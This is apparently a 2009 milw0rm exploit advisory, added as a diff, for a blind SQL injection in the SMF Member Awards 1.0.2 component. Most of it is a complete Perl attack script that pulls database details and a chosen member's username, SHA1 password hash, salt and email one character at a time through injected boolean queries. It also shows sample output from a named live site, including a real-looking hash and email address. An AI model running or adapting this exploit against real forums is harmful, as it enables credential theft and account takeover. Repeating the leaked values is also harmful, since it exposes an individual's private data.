@@ -1,0 +1,285 @@
+-------------------------------------------------------------------------
+ SMF Component Member Awards Blind SQL-injection Vulnerability
+-------------------------------------------------------------------------
+ author: eLwaux
+ thanks: mailbrush, antichat.ru, uasc.org.ua
+-------------------------------------------------------------------------
+ usage:
+     expl.pl http://site.com/smf/index.php ID_MEMBER TABLE_PREF {params}
+     params:
+        -v = get version()
+        -u = get user()
+        -d = get database() 
+        -an = get User Name  (логин)
+        -ap = get User Password (sha1 хеш)
+        -as = get User Salt (сальт)
+        -am = get User Mail (емейл)
+-------------------------------------------------------------------------
+ (
+    also you can modif script source:
+        $SHOW_ALL = 1; == show brute-step result
+        $SHOW_COUNT_REQ = 1 == show req's count
+        $OPTIMAL = 1 == optimal brute
+ )
+-------------------------------------------------------------------------
+example:
+    http://scrubs.net.ru/cms/forum/index.php
+
+    ] Host: scrubs.net.ru
+      BAD answer = 'Ошибка'
+    ] version() = 5
+    ] user() = us5729a@localhost
+    ] database() = db
+    ] id=1 NAME = zhbanito
+    ] id=1 PASS = 4edd40635ac6fd263084d5ccc6fdc624fef3c932
+    ] id=1 SALT = fe81
+    ] id=1 MAIL = shpioner@mail.ru
+-------------------------------------------------------------------------
+ exploit (perl):
+ 
+    #! /usr/bin/perl -w
+
+    use IO::Socket;
+    use warnings;
+    #use threads;
+    #use threads::shared;
+
+    $SHOW_ALL = 1;
+    $SHOW_COUNT_REQ = 1;
+    $OPTIMAL = 1;
+
+    print "  SMF ] MemberAwards 1.0.2 exploit\n";
+    print "  eLwaux(c)antichat 2009\n\n";
+
+    if (!$ARGV[0]) {
+        print "  usage:\n".
+              "     expl.pl http://site.com/smf/index.php ID_MEMBER TABLE_PREF {params}\n".
+              "     params:\n".
+              "        -v = get version()\n".
+              "        -u = get user()\n".
+              "        -d = get database()\n".
+              "        -an = get User Name\n".
+              "        -ap = get User Password\n".
+              "        -as = get User Salt\n".
+              "        -am = get User Mail\n";
+        exit(0);
+    }
+
+    my $Uid = (!$ARGV[1])?'1':$ARGV[1];
+    my $pref = (!$ARGV[2])?'smf_':$ARGV[2];
+    $link .= $ARGV[0].'?action=profile;sa=awardsMembers;u='.$Uid.';id={SQL}';
+
+    $getV = $getU = $getD = $getAN = $getAP = $getAS = $getAM = 0;
+    for (my $i=0;$i<$#ARGV+1;$i++) {
+         my $q = $ARGV[$i];
+         $getV = 1 if ($q eq '-v');
+         $getU = 1 if ($q eq '-u');
+         $getD = 1 if ($q eq '-d');
+         $getAN = 1 if ($q eq '-an');
+         $getAP = 1 if ($q eq '-ap');
+         $getAS = 1 if ($q eq '-as');
+         $getAM = 1 if ($q eq '-am');
+    }
+
+    if ($link =~ /[http:\/\/]{0,}(.+?)\/.+?{SQL}/) {
+        $host = $1;
+    }
+
+    print ' ] Host: '.$host."\n";
+    $BAD = &getBadAnswer();
+    
+    my $SFrom = 0;
+    $SFrom = 41 if ($OPTIMAL == 1);
+    my $SEnd = 0;
+    $SEnd = 122 if ($OPTIMAL == 1);
+    
+    print "   BAD answer = '$BAD'\n\n";
+    print ' ] version() = '.&getVersion(3,5)."\n" if ($getV==1);
+    print ' ] user() = '.&getUser1($SFrom,$SEnd)."\n" if ($getU==1); # a..z
+    print ' ] database() = '.&getDatabase($SFrom,$SEnd)."\n" if ($getD==1); # a..z
+    print "\n";
+
+    print ' ] id='.$Uid.' NAME = '.&getAdminName($SFrom,$SEnd)."\n" if ($getAN==1); # 0..9,a..z
+    print ' ] id='.$Uid.' PASS = '.&getAdminPass($SFrom,$SEnd)."\n" if ($getAP==1); # 0..9,a..z
+    print ' ] id='.$Uid.' SALT = '.&getAdminSalt($SFrom,$SEnd)."\n" if ($getAS==1); # a..z
+    print ' ] id='.$Uid.' MAIL = '.&getAdminMail($SFrom,$SEnd)."\n" if ($getAM==1); # a..z
+
+    #print "\n";
+    print ' ] requests() = '.$SHOW_COUNT_REQ."\n"; # a..z
+
+    exit(0);
+
+
+
+    # get BAD answer
+    sub getBadAnswer() {
+         $BAD = "An Error Has Occurred!";
+         if (&req('1+and+substring(version(),1,1)=-1##+',1000) =~ /<meta name="description" content="(.+?)" .>/) {
+             $BAD = $1;
+         }
+         return $BAD;
+    }
+
+    # GET VERSION() METHOD 1 -==--=--=-=-=-=-=-=-=-=-=-==-=--=
+    # ascii(lower(substring(version(),x,1) WHERE IN (1,...,Y)
+    sub getVersion($$) {
+         for($i=$_[0]; $i<=$_[1]; $i++) {
+            $r = &req('1+and+substring(version(),1,1)='.$i.'##+',1000);
+             if ($r =~ /<meta name="description" content="(.+?)" .>/) {
+                 if (index($1,$BAD)==-1) {
+                     $SHOW_COUNT_REQ++ if ($SHOW_COUNT_REQ!=0);
+                     return $i;
+                 }
+             }
+         }
+         return '<'.$_[0].' and >'.$_[1];
+    }
+
+    # GET USER() METHOD 1 -==--=--=-=-=-=-=-=-=-=-=-==-=--=
+    # ascii(lower(substring(user(),x,1) WHERE IN (1,...,Y)
+    sub getUser1($$) {
+         return &wherein($_[0],$_[1],'user()',0);
+    }
+
+    # GET DATABASE -==--=-==--=---=-==-=-=-=-=-=-=-=-=-==-=--=
+    # ascii(lower(substring(database(),x,1) WHERE IN (1,...,Y)
+    sub getDatabase($$) {
+         return &wherein($_[0],$_[1],'database()',0);
+    }
+
+    # GET USER METHOD 2 -==--=--=-=-=-=-=-=
+    # ascii(lower(substring(user(),1,1)))=Y
+    sub getUser2($$) {
+         $finish = 0; $s = 1;
+         $user = '';
+         while ($finish!=1) {
+             $gs = 0;
+             print "   user($s): \n" if ($SHOW_ALL==1);
+             for($i=$_[0]; $i<=$_[1]; $i++) {
+                 if (&req('1+and+ascii(lower(substring(user(),'.$s.',1)))='.$i.'##+',1000) =~ /<meta name="description" content="(.+?)" .>/) {
+                     print "      (".chr($i).") $i,\n" if ($SHOW_ALL==1);
+                     if (index($1,$BAD)==-1) {
+                         $user .= chr($i);
+                         print "   found $s chars: $i = ".chr($i)." ($user)\n" if ($SHOW_ALL==1);
+                         $s++; $gs = 1;
+                         last;
+                     }
+                 }
+             }
+             print "\n" if ($SHOW_ALL==1);
+             if ($gs == 0) {
+                 if ($user eq '') {return '<'.$_[0].' and >'.$_[1];}
+                 else {return $user;}
+             }
+         }
+         
+    }
+
+    # GET ADMIN PASS_HASH -==--=-==--=---=-==-=-=-=-=-=-=-=-=-==-=--=
+    #smf_members (ID_MEMBER,memberName,passwd,emailAddress,passwordSalt)
+    #             passwd = sha1(strtolower(username.password)
+    #             salt   = substr(md5(mt_rand()), 0, 4)
+
+    sub getAdminName($$) {
+         return &wherein($_[0],$_[1],'memberName',1);
+    }
+    sub getAdminPass($$) {
+         return &wherein($_[0],$_[1],'passwd',1);
+    }
+    sub getAdminSalt($$) {
+         return &wherein($_[0],$_[1],'passwordSalt',1);
+    }
+    sub getAdminMail($$) {
+         return &wherein($_[0],$_[1],'emailAddress',1);
+    }
+
+
+    # NEED FUNCTIONS -==--=--=-=-=-=-=-=-=-=-=-==-=--=
+
+    sub req($$) {
+         $SHOW_COUNT_REQ++ if ($SHOW_COUNT_REQ!=0);
+         $l = $link;
+         $l =~ s/{SQL}/$_[0]/;
+         $r  = "GET $l HTTP/1.1\r\nHost: $host\r\n\r\n";
+         my $sock = sock();
+         print $sock $r;
+         read($sock,my $a,$_[1]);
+         return $a;
+    }
+
+    sub mlist($$) {
+         $s = '';
+         for(my $i=$_[0];$i<=$_[1];$i++) {$s.=$i.',';}
+         return substr($s,0,length($s)-1);
+    }
+
+
+    sub wherein($$$$) { # ,,,, (1=user,2=else)
+         print " ] $_[2]\n" if ($SHOW_ALL==1);
+         my $WHEREIN = 10; # WHERE IN (1,2,3,4,5,6,7,8,9,10)
+         my $res = ''; my $c = 1;
+         my $fmin = $_[0];
+         my $fmax = $_[1];
+         while ($c>=1) {
+                 my $gs = 0;
+                 for (my $i=0;$i<=int(($fmax-$fmin)/$WHEREIN);$i++){
+                     my $s1 = int($fmin+$i*$WHEREIN);
+                     my $s2 = int(($s1+$WHEREIN)>$fmax)?$fmax:($s1+$WHEREIN);
+                     my $ch = ($_[3]==1)?&getUBRUTE($s1,$s2,$c,$_[2]):&getBRUTE($s1,$s2,$c,$_[2]);
+                     if ($ch ne '?') {
+                         $res.=$ch; print "   $_[2]($c) = $ch [$res]\n" if ($SHOW_ALL==1);
+                         $c++; $gs = 1; last;
+                     }
+                 }
+                if ($gs == 0) { $c=-1; return $res; last; }
+         }
+    }
+
+    sub getBRUTE($$$$) { #start,end,pos,text
+         print '         '.$_[0].'...'.$_[1].' ['.$_[2]."]\n" if ($SHOW_ALL==1);
+         if (&req('1+and+ascii(lower(substring('.$_[3].','.$_[2].',1)))+in+('.&mlist($_[0],$_[1]).')%23+',1000) =~ /<meta name="description" content="(.+?)" .>/) {
+            if (index($1,$BAD)==-1) {
+                 for(my $i=$_[0]; $i<=$_[1]; $i++) {
+                     if (&req('1+and+ascii(lower(substring('.$_[3].','.$_[2].',1)))='.$i.'%23+',1000) =~ /<meta name="description" content="(.+?)" .>/) {
+                         if (index($1,$BAD)==-1) {
+                             return chr($i); last;
+                         }
+                     }
+                 }
+            }
+         }
+         return '?';
+    }
+
+    sub getUBRUTE($$$$) { #start,end,pos,text
+         print '         ['.$_[2].'] '.$_[0].'...'.$_[1]."\n" if ($SHOW_ALL==1);
+         if (&req('1+and+(%23)%0Aselect+ascii(lower(substring('.$_[3].','.$_[2].',1)))+from+'.$pref.'members+where+ID_MEMBER='.$Uid.')+in+('.&mlist($_[0],$_[1]).')%23+',1000) =~ /<meta name="description" content="(.+?)" .>/) {
+            if (index($1,$BAD)==-1) {
+                 for(my $i=$_[0]; $i<=$_[1]; $i++) {
+                     if (&req('1+and+(%23)%0Aselect+ascii(lower(substring('.$_[3].','.$_[2].',1)))+from+'.$pref.'members+where+ID_MEMBER='.$Uid.')='.$i.'%23+',1000) =~ /<meta name="description" content="(.+?)" .>/) {
+                         if (index($1,$BAD)==-1) {
+                             return chr($i); last;
+                         }
+                     }
+                 }
+            }
+         }
+         return '?';
+    }
+
+    sub sock {
+        my $sock;
+        do {
+            $sock = new IO::Socket::INET 
+                (
+                    PeerAddr => $host,
+                    PeerPort => 80, 
+                    PeerProto => 'tcp', 
+                    TimeOut => 10
+                ) or print " ] connection error!\n";
+            } while (!$sock);
+        return $sock;
+    }
+-------------------------------------------------------------------------
+
+# milw0rm.com [2009-06-30]
